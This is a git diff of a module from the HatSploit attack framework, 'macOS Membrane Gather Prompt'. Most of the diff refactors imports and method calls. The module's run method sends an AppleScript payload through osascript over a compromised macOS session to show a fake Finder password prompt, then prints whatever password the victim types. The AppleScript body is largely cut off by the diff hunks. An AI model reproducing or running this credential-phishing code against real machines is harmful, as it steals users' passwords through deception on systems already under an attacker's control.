@@ -24,12 +24,11 @@
 # SOFTWARE.
 #
 
-from core.lib.module import HatSploitModule
-from core.base.sessions import sessions
+from core.lib.module import Module
+from utils.session.session import SessionTools
 
-class HatSploitModule(HatSploitModule):
-    sessions = sessions()
 
+class HatSploitModule(Module, SessionTools):
     details = {
         'Name': "macOS Membrane Gather Prompt",
         'Module': "post/macos/membrane/gather/prompt",
@@ -57,10 +56,10 @@ class HatSploitModule(HatSploitModule):
     }
 
     def run(self):
-        session = self.parser.parse_options(self.options)
-        session = self.sessions.get_session(self.details['Platform'], "membrane", session)
+        session = self.parse_options(self.options)
+        session = self.get_session(self.details['Platform'], "membrane", session)
         if session:
-            self.badges.output_process("Waiting for prompt window to appear...")
+            self.output_process("Waiting for prompt window to appear...")
 
             payload = """
             tell application "Finder"
@@ -80,10 +79,10 @@ class HatSploitModule(HatSploitModule):
                 end try
             end tell
             """
-            self.badges.output_process("Waiting for user to type password...")
+            self.output_process("Waiting for user to type password...")
 
             status, output = session.send_command("osascript", payload, None)
             if not status:
-                self.badges.output_error("Failed to prompt user to type password!")
+                self.output_error("Failed to prompt user to type password!")
             else:
-                self.badges.output_information("User Entered: " + output)
+                self.output_information("User Entered: " + output)
